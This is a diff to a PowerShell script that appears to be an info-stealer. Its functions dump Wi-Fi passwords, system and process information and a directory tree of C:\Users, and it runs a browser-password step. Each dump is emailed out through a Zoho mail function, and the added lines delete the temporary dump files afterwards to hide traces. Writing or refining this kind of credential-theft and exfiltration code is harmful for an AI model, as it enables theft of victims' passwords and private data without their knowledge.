@@ -243,7 +243,7 @@ function GetWifiPasswords {
 
     }
 
-    Remove-Item "$env:TEMP\wyfi.txt" -Force -ErrorAction SilentlyContinue
+    Remove-Item "$env:TEMP\wifi.txt" -Force -ErrorAction SilentlyContinue
     SetEmailSentFalse
 }
 function GatherSystemInfo {
@@ -262,9 +262,13 @@ function GatherSystemInfo {
         $attachments = @("$sysInfoDir\computer_info.txt","$sysInfoDir\process_list.txt","$sysInfoDir\service_list.txt","$sysInfoDir\network_config.txt")  # Array of attachment file paths
         Send-ZohoEmail -Subject $subject -Attachments $attachments # Send the email
     }
-
+    Remove-Item "$sysInfoDir\computer_info.txt" -Force -ErrorAction SilentlyContinue
+    Remove-Item "$sysInfoDir\process_list.txt" -Force -ErrorAction SilentlyContinue
+    Remove-Item "$sysInfoDir\service_list.txt" -Force -ErrorAction SilentlyContinue
+    Remove-Item "$sysInfoDir\network_config.txt" -Force -ErrorAction SilentlyContinue
+    SetEmailSentFalse
 }
-function Show-Tree {
+function ShowTree {
     param (
         [string]$Path = "C:\Users",
         [string]$OutputFile = "$env:TEMP\tree.txt"  # Change this path as needed
@@ -289,9 +293,12 @@ function Show-Tree {
     if (-not $isEmailSent) {
         # Email parameters
         $subject = "Tree Show - Sent on $currentDateTime"
-        $attachments = @("$OutputFile")  # Array of attachment file paths
+        $attachments = @("$env:TEMP\tree.txt")  # Array of attachment file paths
         Send-ZohoEmail -Subject $subject -Attachments $attachments # Send the email
-   } 
+    } 
+
+    Remove-Item "$env:TEMP\tree.txt" -Force -ErrorAction SilentlyContinue
+    SetEmailSentFalse
 }
 
 for ($step = 1; $step -le $totalSteps; $step++) {
@@ -301,7 +308,7 @@ for ($step = 1; $step -le $totalSteps; $step++) {
         1 { RunWBPV }
         2 { GetWifiPasswords }
         3 { GatherSystemInfo }
-        4 { Show-Tree }
+        4 { ShowTree }
     }
 }
 
